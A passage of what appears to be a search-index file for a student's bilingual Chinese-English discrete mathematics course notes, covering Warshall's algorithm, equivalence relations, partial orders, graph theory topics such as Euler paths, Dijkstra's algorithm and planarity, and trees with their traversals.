R.</p> <p>R* \u662f\u4eceR\u7684\u4e00\u6b21\u65b9\u5230\u65e0\u7a77\u6b21\u65b9\u7684\u5e76\u96c6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u77e9\u9635\u523b\u753b</p> <p>R \u7684\u4f20\u9012\u95ed\u5305\u7b49\u4e8eR *</p> <p>\u5f15\u7406\uff1aA\u662f\u4e00\u4e2a\u6709n\u4e2a\u5143\u7d20\u7684\u96c6\u5408\uff0c\u5982\u679c\u6709\u4e00\u6761a\u5230b\u7684\u8def\u5f84\uff0c\u5219\u8fd9\u4e2a\u8def\u5f84\u4e0d\u8d85\u8fc7n\uff0c\u5f53a\u4e0d\u7b49\u4e8eb\u662f \u8fd9\u4e2a\u8def\u5f84\u4e0d\u8d85\u8fc7n-1</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#4-warshalls-alogrithm","title":"4) Warshall's Alogrithm","text":"<p>\u4e00\u79cd\u7b97\u6cd5\uff0c\u53ea\u9700\u89812*n^3\u6b21\u4f4d\u8fd0\u7b97\u5373\u53ef\u6c42\u51fa\u4f20\u9012\u95ed\u5305</p> <p>\u5148\u5bf9\u8def\u5f84\u4e0a\u7684\u5185\u90e8\u9876\u70b9\uff08interior vertices\uff09\u8fdb\u884c\u5b9a\u4e49\uff0c\u5373\u4e3a\u4e00\u6761\u8def\u5f84\u53bb\u5f00\u8d77\u70b9\u548c\u7ec8\u70b9\u7684\u5176\u4f59\u9876\u70b9\uff0c\u5982\u679c\u8d77\u70b9\u540c\u65f6\u5728\u5185\u90e8\u4e5f\u51fa\u73b0\uff0c\u4e5f\u628a\u5b83\u5f53\u505a\u5185\u90e8\u9876\u70b9</p> <p>\u9996\u5148\u9700\u8981\u6784\u9020\u4e00\u7cfb\u52170 1\u77e9\u9635 W0\u4e3a\u539f\u521d\u5173\u7cfb\u5f62\u6210\u7684\u77e9\u9635 Wk\u7684\u5143\u7d20wk\uff08i\uff0cj\uff09\u6709\u5982\u4e0b\u5224\u65ad \u5982\u679c\u5b58\u5728\u4e00\u6761\u8def\u5f84\u4ece\u9876\u70b9vi\u5230vj\uff0c\u5176\u6240\u6709\u5185\u90e8\u8282\u70b9\u5747\u5728v1\u5230vk\u4e4b\u4e2d\u7684\uff0c\u5219\u4e3a1 \u53cd\u4e4b\u5219\u4e3a0</p> <p>w0\u4e3a\u5168\u90e8\u76f4\u8fde\u7684\u8def\u5f84 w1\u4e3a\u5168\u90e8\u76f4\u8fde\u548c\u5185\u90e8\u9876\u70b9\u4e3aa\u7684\u8def\u5f84 w2\u4e3a\u5168\u90e8\u76f4\u8fde\u548c\u5185\u90e8\u5b9a\u70b9\u4e3aa\uff0cb\u6216a\u6216b\u7684\u8def\u5f84</p> <p>\u5230Wn\u5373\u7ed3\u675f\uff0cn\u4e3a\u96c6\u5408\u4e2d\u7684\u5143\u7d20\u6570\u91cf</p> <p>procedure Warshall (MR : n \u00d7 n zero\u2013one matrix)</p> <p>W := MR</p> <p>for k := 1 to n</p> <p>for i := 1 to n</p> <p>for j := 1 to n</p> <p>wij := wij \u2228 (wik \u2227 wkj)</p> <p>return W{W = [wij] is MR\u2217 }</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#95-equivalence-relations","title":"9.5 Equivalence Relations","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-introduction-to-equivalence-relation","title":"1) introduction to equivalence relation","text":"<p>A relation on a set A is called an equivalence relation if it is reflexive, symmetic and transitive. \u81ea\u53cd \u5bf9\u79f0 \u4f20\u9012</p> <p>\u7279\u522b\u5730 \u5982\u679c\u4e24\u4e2a\u5143\u7d20\u7531\u7b49\u4ef7\u5173\u7cfb\u8054\u7cfb\uff0c\u5219\u4ed6\u4eec\u4e3a\u7b49\u4ef7\u7684\uff0c\u8bb0\u4e3aa~b</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-equivalence-classes","title":"2) equivalence classes","text":"<p>R is an equivalence relation on a set A. a is an element in A, and we call all the elements relate with a by relation R. \u5c06\u8fd9\u4e2a\u96c6\u5408\u79f0\u4e3aa\u7684\u7b49\u4ef7\u7c7b notation [a]R, a \u5173\u4e8e\u7b49\u4ef7\u5173\u7cfbR\u7684\u7b49\u4ef7\u7c7b\uff0c\u5982\u679c\u4e0d\u8003\u8651\u5176\u4ed6\u5173\u7cfb\u4e86\uff0c\u4e5f\u53ef\u4ee5\u628aR\u53bb\u6389</p> <p>representative of an equivalence class. \u7b49\u4ef7\u7c7b\u7684\u4ee3\u8868\u5143\uff0c\u6307\u7b49\u4ef7\u7c7b\u91cc\u9762\u968f\u4fbf\u4e00\u4e2a\u5143\u7d20</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#3-equivalence-classes-and-partitions","title":"3) equivalence classes and partitions","text":"<p>\u4e00\u4e2a\u96c6\u5408\u4e0a\u7684\u7b49\u4ef7\u5173\u7cfb\u6240\u6784\u6210\u7684\u7b49\u4ef7\u7c7b\u5c31\u662f\u5bf9\u4e8e\u8fd9\u4e2a\u96c6\u5408\u7684\u4e00\u4e2a\u5212\u5206</p> <p>\u540c\u6837\u7684\u4e00\u4e2a\u96c6\u5408\u7684\u5212\u5206\u4e5f\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u7b49\u4ef7\u5173\u7cfb</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#96-partial-orderings-650-518","title":"9.6 Partial Orderings 650 518","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-introduction-to-partial-orderings","title":"1) introduction to partial orderings","text":"<p>a relation R on a set of S, if it is relexive antisymmetric and transitive, the relation is partial ordering\uff08\u81ea\u53cd\uff0c\u53cd\u5bf9\u79f0\uff0c\u4f20\u9012\u7684\uff09 this set S and R we call them partial ordering set or poset(\u504f\u5e8f\u96c6) denote by (S, R) S \u4e2d\u7684\u5143\u7d20\u65f6\u504f\u5e8f\u96c6\u7684\u5143\u7d20</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-some-porperties-of-poset","title":"2) some porperties of poset","text":"<p>1.\u5982\u679crelation\u4e2d\u5305\u62ec\u4e86a\u548cb\u7684\u5173\u7cfb\uff0c\u5219\u79f0a\u548cb\u662f\u53ef\u6bd4\u7684comparable</p> <p>2.\u5982\u679c\u4e00\u4e2aposet\u6bcf\u5bf9\u5143\u7d20\u90fd\u662f\u53ef\u6bd4\u7684\uff0c\u5219\u79f0\u8fd9\u79cdposet\u4e3atotally ordered or linearly ordered set. and the relation is total or linear order. this poset also called chain(\u5168\u5e8f\u96c6\u4e5f\u53eb\u94fe)</p> <p>3.\u4e00\u4e2a\u5168\u5e8f\u96c6\uff0c\u5176\u6240\u6709\u7684\u5b50\u96c6\u90fd\u6709\u6700\u5c0f\u5143\u7d20\uff0c\u6211\u4eec\u79f0\u5176\u4e3a\u826f\u5e8f\u96c6\u5408well-ordered set</p> <p>THE PRINCIPLE OF WELL-ORDERED INDUCTION</p> <p>Suppose that S is a well-ordered set. Then P(x) is true for all x \u2208 S, if</p> <p>INDUCTIVE STEP:</p> <p>For every y \u2208 S, if P(x) is true for all x \u2208 S with x \u227a y, then P(y) is</p> <p>true.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#3-lexicograhic-order","title":"3) lexicograhic order(\u5b57\u5178\u987a\u5e8f)","text":"<p>\u5728\u4e24\u4e2a\u504f\u5e8f\u96c6\u7684\u7b1b\u5361\u5c14\u79ef\u4e0a\u6784\u9020\u4e00\u4e2a\u504f\u5e8f\uff0c\u5148\u6bd4\u8f83a1\u548ca2 \u518d\u6bd4\u8f83b1\u548cb2\uff08\u6bd4\u8f83\u65b9\u5f0f\u4f9d\u7167\u5404\u81ea\u7684\u504f\u5e8f\uff09</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#4-hasse-diagrams","title":"4) Hasse Diagrams","text":"<p>\u8fd9\u662f\u4e00\u79cd\u4e13\u95e8\u9488\u5bf9\u504f\u5e8f\u5173\u7cfb\u6784\u9020\u7684\u56fe\uff0c\u53bb\u6389\u539f\u672c\u7684\u56fe\u4e0a\u6240\u6709\u7684\u73af\u4ee5\u53ca\u53ef\u4ee5\u901a\u8fc7\u4f20\u9012\u6027\u5173\u7cfb\u5f97\u5230\u7684\u8fb9\uff0c\u4e14\u8ba9\u6240\u6709\u7bad\u5934\u5411\u4e0a\uff0c\u6700\u540e\u5220\u9664\u7bad\u5934</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#5-maximal-and-minimal-elements","title":"5) Maximal and Minimal elements","text":"<p>\u6781\u5c0f\u5143\u548c\u6781\u5927\u5143\uff0c\u6307\u4e0d\u5b58\u5728\u4e00\u4e2a\u5143\u53ef\u4ee5\u6bd4\u4ed6\u4eec\u66f4\u5c0f\u6216\u8005\u66f4\u5927\uff0c\u5c31\u662f\u8bf4\u53ef\u80fd\u4f1a\u5b58\u5728\u4e0d\u6b62\u4e00\u4e2a\uff0c\u5b83\u4eec\u5728Hasse Diagram\u4e2d\u7684\u9876\u7aef\u548c\u5e95\u7aef</p> <p>greatest and least elements \u8fd9\u4e9b\u5143\u7d20\u662f\u6700\u5927\u5143\u548c\u6700\u5c0f\u5143\uff0c\u5b83\u4eec\u4f1a\u5927\u4e8e\u548c\u5c0f\u4e8e\u6240\u6709\u5176\u4ed6\u5143\u7d20\uff0c\u53ea\u5b58\u5728\u4e00\u4e2a</p> <p>upper bound and lower bound \u4e0a\u754c\u548c\u4e0b\u754c,\u5bf9\u4e8e\u4e00\u4e2a\u5b50\u96c6\u800c\u8a00\uff0c\u5168\u96c6\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\u53ef\u4ee5\u505a\u5230\u5927\u4e8e\u7b49\u4e8e\u5176\u4e2d\u5168\u90e8\u5143\u7d20\uff0c\u5219\u79f0\u5176\u4e3a\u4e0a\u754c least upper bound and greatest lower bound \u5982\u679c\u6709\u4e00\u4e2a\u4e0a\u754c\u5c0f\u4e8e\u5176\u6240\u6709\u5176\u4ed6\u7684\u4e0a\u754c\uff0c\u5c31\u53eb\u505a\u6700\u5c0f\u4e0a\u754c</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#6-lattices","title":"6) Lattices","text":"<p>lattice \u683c \u4e00\u4e2a\u6709\u6700\u5927\u4e0b\u754c\u548c\u6700\u5c0f\u4e0a\u754c\u7684\u504f\u5e8f\u96c6\u4e3a\u683c</p> <p>topological sorting\u62d3\u6251\u6392\u5e8f\u89c1\u4e66\u672c 660 526</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#unit-10-graph","title":"Unit 10 Graph","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#102-graph-terminology-and-special-types-of-graphs","title":"10.2 Graph Terminology and Special Types of Graphs","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#basic-terminology-of-undirected-graphs","title":"Basic Terminology of undirected graphs","text":"<p>1.vertices u and v are endpoints of an edge they are called adjacent(\u90bb\u70b9)</p> <p>2.G=(V,E) G is graph; V is a set of all edges; E is a set of all vertices</p> <p>3.For a vertice v ,N(v) is a set of v and all of its adjacent and N(A) is  N(v)</p> <p>java mysql cmake htm</p> <p>x86 asm riscv asm verilog python qt</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#105-euler-and-hamilton-paths","title":"10.5 Euler and Hamilton Paths","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#introduction-of-euler-circuit-and-path","title":"introduction of Euler circuit and path","text":"<p>Euler circuit is simple circuit contianing all edges of G.</p> <p>Euler path is simple path containing all edges of G.</p> <p>A connected multigraph with at least two vertices has Euler circuit if and only if each of vertices have even degree.</p> <p>A connected multigraph has an Euler path but not an Euler circuit if and only if it has exactly two vertices of odd degree.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#the-solution-of-euler-circuit-and-path","title":"the solution of Euler circuit and path","text":"<p>At first we find a circuit ,and then we delete all edges the circuit has and the vertices that become isolate. Then we find another circuit and continue until there isn't any vertices. Finally we splice the new circuits to the first one.(\u627e\u5230\u56de\u8def\uff0c\u5220\u6389\u8fb9\u548c\u70b9\uff0c\u518d\u627e\u56de\u8def\uff0c\u8fde\u63a5\u76f4\u5230\u65e0\u70b9)</p> <p>If  there is Euler path we must begin at one of the odd vertices</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#alg-of-euler-circuit","title":"ALG of Euler Circuit","text":"<p>procedure Euler(G: connected multigraph with all vertices of</p> <p>even degree)</p> <p>circuit := a circuit in G beginning at an arbitrarily chosen</p> <p>vertex with edges successively added to form a path that</p> <p>returns to this vertex</p> <p>H := G with the edges of this circuit removed</p> <p>while H has edges</p> <p>subcircuit := a circuit in H beginning at a vertex in H that</p> <p>also is an endpoint of an edge of circuit</p> <p>H := H with edges of subcircuit and all isolated vertices</p> <p>removed</p> <p>circuit := circuit with subcircuit inserted at the appropriate</p> <p>vertex</p> <p>return circuit {circuit is an Euler circuit}</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#the-introduction-of-hamilton-path-and-circuit","title":"the introduction of Hamilton path and circuit","text":"<p>a simple path passes through every vertex only once of G is called Hamilton path</p> <p>a simple circuit passes through every vertex only once of G is called Hamilton circuit</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#the-judge-of-hamilton-path-and-circuit","title":"the judge of Hamilton path and circuit","text":"<p>if there is a vertex degree one, there isn't Hamilton circuit</p> <p>Hamilton circuit doesn't consist smaller circuit</p> <p>if G is a simple graph and n&gt;=3 and degree of each vertex &gt;=n/2, then G has Hamilton circuit</p> <p>if G is a simple graph and n&gt;=3 and choose u and v we can find deg(u)+deg(v)&gt;=n, then G has Hamilton circuit</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#106-shortest-path-problems","title":"10.6 Shortest-Path Problems","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#weighted-graphs","title":"Weighted Graphs","text":"<p>A graph that has a number assigned to each edges called weighted graphs.</p> <p>the length of a path is the sum of weights of edges in this path(if it isn't a weighted graphs, the length of path may is the sum of edges)</p> <p>\u200d</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#a-shortest-path-algorithm","title":"A Shortest-Path Algorithm","text":"<p>Dijkstra's Algorithm  </p> <p>procedure Dijkstra(G: weighted connected simple graph, with</p> <p>all weights positive)</p> <p>{G has vertices a = v0, v1,\u2026 , vn = z and lengths w(vi , v</p> <p>j )</p> <p>where w(vi , v</p> <p>j ) = \u221e if {vi , v</p> <p>j } is not an edge in G}</p> <p>for i := 1 to n</p> <p>L(vi ) := \u221e</p> <p>L(a) := 0</p> <p>S := \u2205</p> <p>{the labels are now initialized so that the label of a is 0 and all</p> <p>other labels are \u221e, and S is the empty set}</p> <p>while z \u2209 S</p> <p>u := a vertex not in S with L(u) minimal</p> <p>S := S \u222a {u}</p> <p>for all vertices v not in S</p> <p>if L(u) + w(u, v) &lt; L(v) then L(v) := L(u) + w(u, v)</p> <p>{this adds a vertex to S with minimal label and updates the</p> <p>labels of vertices not in S}</p> <p>return L(z) {L(z) = length of a shortest path from a to z}</p> <p>\u4e2d\u6587\u63cf\u8ff0\uff1aabcdef\u4e3a\u9876\u70b9 \u5982\u679c\u8981\u4ecea\u5230f  \u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c \u96c6\u5408{a}\uff0c\u73b0\u8981\u52a0\u5165\u4e00\u4e2a\u9876\u70b9\uff0c\u4f7f\u5176\u5230a\u7684\u8ddd\u79bb\u6700\u5c0f\uff0c\u5047\u8bbe\u52a0\u5165b \u96c6\u5408{a\uff0cb}\uff0c\u518d\u52a0\u5165\u4e00\u4e2a\u9876\u70b9\uff0c\u4f7f\u5176\u5230a\u7684\u8ddd\u79bb\u6700\u5c0f\uff0c\u8fd9\u91cc\u53ef\u4ee5\u662fa\u76f4\u63a5\u5230\u8be5\u9876\u70b9\uff0c\u4e5f\u53ef\u4ee5\u662fa\u901a\u8fc7a b \u518d\u5230\u8fd9\u4e2a\u9876\u70b9\uff0c\u5982\u6b64\u5f80\u590d\u8fbe\u5230f\uff0c\u6bcf\u4e00\u6b21\u8981\u627e\u51fa\u6700\u9760\u8fd1a\u7684\u65b0\u9876\u70b9\uff0c\u53ef\u4ee5\u5728\u6bcf\u4e2a\u52a0\u5165\u7684\u9876\u70b9\u4e0a\u6807\u8bb0\u4ed6\u4eec\u5230a\u7684\u6700\u77ed\u8ddd\u79bb\u65b9\u4fbf\u540e\u7eed\u8ba1\u7b97</p> <p>Dijkstra's algorithm can find the length of a shortest path between two vertices in a connected simple undirected weighted graph.(\u8054\u901a\u7b80\u5355\u65e0\u5411\u52a0\u6743\u56fe)And its operations are O(n^2)</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#the-traveling-salesperson-problem","title":"The Traveling Salesperson Problem","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#107-planar-graphs","title":"10.7 Planar Graphs","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1the-introduction-of-planar-graph","title":"1).The introduction of Planar graph","text":"<p>A graph is called planar if it can be drawn in the plane without any crossing.\uff08\u7701\u6d41 \u753b\u5728\u5e73\u9762\u65e0\u4ea4\u70b9\uff09</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2eulers-formula","title":"2).Euler's Formula","text":"<p>G is a graph and G has e edges and v vertices . r is planar representation(\u5e73\u9762) of  G. Then r=e-v+2</p> <p>Proof of Euler's Formula:  </p> <p>corollary:(these corollary can be used to prove a gragh isn't planar) 1.G is a graph and G has e edges and v vertices. if v&gt;=3 then e&lt;=3v-6</p> <p>2.If G is a connected planar simple graph, then G has a vertex of degree not exceeding 5 3.If G is a connected planar simple graph, and v&gt;=3 and no circuits of length 3, then e&lt;=2*v-4</p> <p>degree of region is the number of boundary of this region.(\u9762\u7684\u5ea6\u5c31\u662f\u56f4\u6210\u8fd9\u4e2a\u9762\u7684\u8fb9\u7684\u6570\u91cf)</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#3kuratowskis-theorem","title":"3).Kuratowski's Theorem","text":"<p>Elementary subdivision(\u521d\u7b49\u7ec6\u5206) : remove an edge {u,v} and adding a new vertex w and edges {u,w} and {w,v}. This action is called Elementary subdivision. If a graph is planar, then it is also planar after Elementary subdivision.</p> <p>\u200b</p> <p>If G2 is comes from G1 elementary subdivision, we call G1 and G2 is homeomorphic(\u540c\u80da). (just like this picture)</p> <p>Theorem: A graph is nonplanar if and only if it contains a subgraph homeomorphic to K3,3 or K5.</p> <p>usually used to judge it isn't planar.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#108-graph-coloring","title":"10.8 Graph Coloring","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1introduction-to-the-four-color-theorem","title":"1).Introduction to The Four Color Theorem","text":"<p>the dual graph(\u5bf9\u5076\u56fe): \u200bit is a way to represent real map using mathematic method. each region of map is a vertex and if two regions have common border(\u76f8\u63a5\u58e4) then there is an edge between two vertices.</p> <p>The coloring of a simple graph is the assignment of a color to a vertex so that no two adjacent vertices are assigned the same color.</p> <p>The chromatic number of a graph is the least number of color to coloring it. It is noted as X(G)</p> <p>The Four Color Theorem: X(G)&lt;=4 if G is a planar graph.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#unit11-tree","title":"Unit11 Tree","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#111-introduction-to-trees","title":"11.1 Introduction to Trees","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-what-is-tree","title":"1) what is tree","text":"<p>Tree is a particluar type of graph.</p> <p>There is two ways to judge whether it is a tree. A tree is a connected undirected graph with no simple circuits. An undirected graph is a tree if and only if there is unique simple path between two vertices.</p> <p>forest it is a graph with no simple circuits and it isn't connected.This graph is called forest. And each of their connected compoents(\u5206\u652f) is a tree.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-rooted-tree","title":"2) rooted tree","text":"<p>A rooted tree is a special tree which one vertex is designed as a root and every edge is directed away from the root.(\u6b64\u5904\u5df2\u7ecf\u88ab\u8bbe\u8ba1\u4e3a\u4e00\u4e2a\u6709\u5411\u56fe\uff0c\u6240\u6709\u7684\u8fb9\u7684\u65b9\u5411\u90fd\u662f\u8fdc\u79bbroot)</p> <p>we have several termnologies: parent child sibling(have same parent) leaf(no child) descendant(\u5b50\u4ee3) ancestor(\u7956\u5148)  descendant and ancestor is contray</p> <p>the vertices of tree can be divided into root, , internal vertices(\u6709\u5b69\u5b50\u7684\u7ed3\u70b9\u5305\u62ecroot) and leaf.</p> <p>subtree</p> <p>m-ary tree is a tree the number of the children of a vertex is less than m. full m-ary tree is a tree the number of the children of a vertex is exactly m. When m is 2, we called this m-ary tree binary tree.</p> <p>ordered rooted tree It is a rooted tree when the children of each internal vertex is ordered. Specially, we have a ordered binary tree. We called the first child as left child and the second child as right child. The tree rooted at left child is left subtree.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#3-properties-of-trees","title":"3) properties of trees","text":"<p>A tree with n vertices has n-1 edges. (we can use recurrence to prove it)</p> <p>A full m-ary tree with i internal vertices contains n=m*i+1 vertices.</p> <p>The relation between vertices, internal vertices and leaves to full m-ary tree.</p> <p>(i ) n vertices has i = (n \u2212 1)\u2215m internal vertices and l = [(m \u2212 1)n + 1]\u2215m leaves,</p> <p>(ii ) i internal vertices has n = mi + 1 vertices and l = (m \u2212 1)i + 1 leaves,</p> <p>(iii ) l leaves has n = (ml \u2212 1)\u2215(m \u2212 1) vertices and i = (l \u2212 1)\u2215(m \u2212 1) internal vertices.</p> <p>Balanced m-ary trees</p> <p>to explain the balanced m-ary tree, we need some concepts. The level of a vertex is the length from root to it. The level of root is 0. The height of a tree is the maximum of the vertex in the tree.</p> <p>A rooted m-ary tree of height  h is balanced if all leaves are at levels h or h-1.</p> <p>There are at most m**h leaves in an m-ary tree of height h.</p> <p>\u4e00\u4e2a\u9ad8\u5ea6\u4e3ah\u7684m\u53c9\u6811\u6709l\u4e2a\u6811\u53f6\uff0ch \u2265 \u2308logm l\u2309. \u53d6\u7b49\u53f7\u7684\u65f6\u5019\u662f\u6ee1\u4e8c\u53c9\u6811\u548c\u5e73\u8861\u7684</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#112-application-of-trees","title":"11.2 Application of Trees","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-binary-search-trees","title":"1) Binary search trees","text":"<p>design a tree, if the new point is less than a vertex it will be its left child, else it will be its right child</p> <p>the algorithm of binary search tree is on the page 795.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-decision-trees","title":"2) Decision trees","text":"<p>each of internal vertex is correspond to a decision. each of possible solution is a path from root to a leaf.</p> <p>for example, we can create a decision tree to the order the list of [a,b,c]</p> <p>\u200b\u200b</p> <p>we have some theorems</p> <p>\u200d</p> <p>\u54c8\u592b\u66fc\u6811\u89c1\u4e2d\u6587\u4e66\u672c 648</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#113-tree-traversal-808-656","title":"11.3 Tree Traversal 808 656","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-universal-address-systems","title":"1) universal address systems","text":"<p>\u4e00\u4e2a\u901a\u7528\u7684\u5730\u5740\u7cfb\u7edf</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-ways-to-traversal-a-tree","title":"2) ways to traversal a tree","text":"<p>we have three useful ways to traversal a tree</p> <p>preorder traversal</p> <p>\u5148\u904d\u5386\u6839\u8282\u70b9\uff0c\u7136\u540e\u8bbf\u95ee\u5de6\u5b50\u6811\u5230\u5e95\uff0c\u65e0\u6cd5\u5411\u4e0b\u65f6\u518d\u56de\u6eaf\uff0c\u8bbf\u95ee\u53e6\u4e00\u8fb9\uff0c\u539f\u5219\u5728\u4e8e\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u88ab\u8bbf\u95ee\u4e86\uff0c\u6839\u5230\u8fd9\u4e2a\u8282\u70b9\u7684\u8def\u5f84\u4e0a\u6240\u6709\u8282\u70b9\uff0c\u4e5f\u5373\u5b83\u7684\u7236\u4eb2\u548c\u7956\u5148\u8282\u70b9\u90fd\u5df2\u88ab\u8bbf\u95ee</p> <p>inoredered traversal</p> <p>\u5148\u8bbf\u95ee\u6700\u5de6\u4fa7\u7684\u53f6\u5b50\u8282\u70b9\uff0c\u7136\u540e\u5411\u4e0a\u8bbf\u95ee\u4e00\u4e2a\u8282\u70b9\uff0c\u5728\u770b\u5b83\u6709\u65e0\u53f3\u5b50\u6811\uff0c\u5148\u8bbf\u95ee\u4e00\u4e2a\u513f\u5b50\u8282\u70b9\u5728\u8bbf\u95ee\u7236\u4eb2\u7ed3\u70b9\uff0c\u518d\u8bbf\u95ee\u5176\u4ed6\u513f\u5b50\u8282\u70b9\u7684\u505a\u6cd5</p> <p>postordered traversal</p> <p>\u5148\u8bbf\u95ee\u505a\u5de6\u4fa7\u7684\u53f6\u5b50\u8282\u70b9\uff0c\u7136\u540e\u56de\u6eaf\uff0c\u539f\u5219\u5728\u4e8e\u4e00\u4e2a\u7236\u4eb2\u7ed3\u70b9\u8981\u88ab\u8bbf\u95ee\uff0c\u5fc5\u987b\u5176\u6240\u6709\u513f\u5b50\u8282\u70b9\u5df2\u7ecf\u88ab\u8bbf\u95ee\u3002</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#114-spanning-trees","title":"11.4 Spanning Trees(\u751f\u6210\u6811)","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-introduction-to-spanning-tree","title":"1) introduction to spanning tree","text":"<p>Let G be a simple graph. A spanning tree of G is a subgraph of G that is a tree containing every vertex of G.</p> <p>for G with a spanning tree as its subgraph if and only if it must be connected.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-depth-first-search","title":"2) Depth-First search","text":"<p>\u4efb\u610f\u9009\u4e00\u4e2a\u9876\u70b9\uff0c \u627e\u548c\u5b83\u76f8\u90bb\u7684\u4e00\u4e2a\u65b0\u7684\u9876\u70b9\uff08\u56e0\u4e3a\u6700\u7ec8\u90fd\u4f1a\u56de\u6eaf\u5230\u7684\uff09\uff0c\u52a0\u5165\u8fdb\u6765\uff0c\u7136\u540e\u6709\u7684\u6240\u6709\u9876\u70b9\uff0c\u6309\u8fd9\u4e2a\u601d\u8def\u4e0d\u65ad\u5411\u524d\uff0c\u76f4\u5230\u65e0\u6cd5\u5f80\u524d\u3002</p> <p>\u5982\u679c\u6240\u6709\u5df2\u7ecf\u904d\u5386\uff0c\u5219\u6210\u529f\u3002</p> <p>\u82e5\u6ca1\u6709\u5b8c\u5168\u904d\u5386\uff0c\u5219\u8d70\u5230\u5934\u7684\u9876\u70b9\u56de\u9000\uff08\u5df2\u7ecf\u8054\u7cfb\u4e0a\u7684\u8fb9\u548c\u70b9\u4e0d\u5220\u9664\uff09\uff0c\u770b\u770b\u8fd8\u6709\u6ca1\u6709\u65b0\u7684\u9876\u70b9\u53ef\u4ee5\u8d70\uff0c\u5982\u679c\u6ca1\u6709\u518d\u56de\u9000\u3002</p> <p>\u200b\u200b</p> <p>visit \u662f\u4e00\u4e2a\u9012\u5f52\u51fd\u6570 \u5982\u679c\u6ca1\u6709\u7ed3\u70b9\u53ef\u4ee5\u7eb3\u5165 \u5c31\u4f1a\u56de\u9000</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#3-breadth-first-search","title":"3) Breadth-First search","text":"<p>\u4efb\u610f\u9009\u4e00\u4e2a\u9876\u70b9\u505a\u6839\uff0c\u628a\u76f8\u90bb\u7684\u8fb9\u90fd\u8d70\u4e00\u904d\uff08\u6df1\u5ea6\u662f\u627e\u4e00\u6761\uff0c\u5e7f\u5ea6\u627e\u5168\u90e8\uff09\uff0c\u8fd9\u4e9b\u627e\u5230\u7684\u9876\u70b9\u662flevel 1\u3002</p> <p>\u7136\u540e\u628a\u65b0\u7eb3\u5165\u7684\u9876\u70b9\uff0c\u518d\u5ea6\u628a\u5b83\u4eec\u76f8\u90bb\u7684\u6240\u6709\u65b0\u9876\u70b9\u8fde\u4e0a\u5e76\u7eb3\u5165\uff0c\u91cd\u590d\u6b64\u8fc7\u7a0b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#4-backtracking-application","title":"4) Backtracking Application","text":"<p>\u56de\u6eaf\u7b97\u6cd5\u5728\u6811\u4e2d\u5f88\u591a\u5730\u65b9\u90fd\u6709\u5e94\u7528</p> <p>\u6bd4\u5982\u51b3\u7b56\u6811\uff0c\u4ec0\u4e48\u65f6\u5019\u5e94\u8be5\u987a\u7740\u51b3\u7b56\u6811\u5411\u4e0b\u8d70\uff0c\u4ec0\u4e48\u65f6\u5019\u8981\u56de\u6eaf\u4e0a\u53bb\uff0c\u901a\u8fc7\u5411\u4e0b\u548c\u56de\u9000\u6765\u627e\u5230\u6700\u4f18\u89e3</p> <p>\u6bd4\u5982\u56fe\u7740\u8272\u95ee\u9898\uff08graph coloring\uff09\u8ba9\u5176\u7528\u51e0\u79cd\u989c\u8272\u6765\u7ed9\u4e00\u5f20\u56fe\u52a0\u4e0a\u989c\u8272\uff0c\u7136\u540e\u5f62\u6210\u4e00\u4e2a\u6811\uff0c\u5411\u4e0b\u8d70\uff0c\u5982\u679c\u8d70\u5230\u540e\u9762\u53d1\u73b0\u989c\u8272\u4e0d\u591f\u4e86\uff0c\u90a3\u5c31\u56de\u6eaf\u53bb\u67e5\u770b\u5176\u4ed6\u53ef\u80fd</p> <p>\u6bd4\u5982n\u7687\u540e\u95ee\u9898 \u5728\u4e00\u4e2anxn\u7684\u68cb\u76d8\u91cc\u653e\u6700\u591a\u51e0\u4e2a\u7687\u540e\uff0c\u5979\u4eec\u4e0d\u4f1a\u4e92\u76f8\u5403</p> <p>\u200b</p> 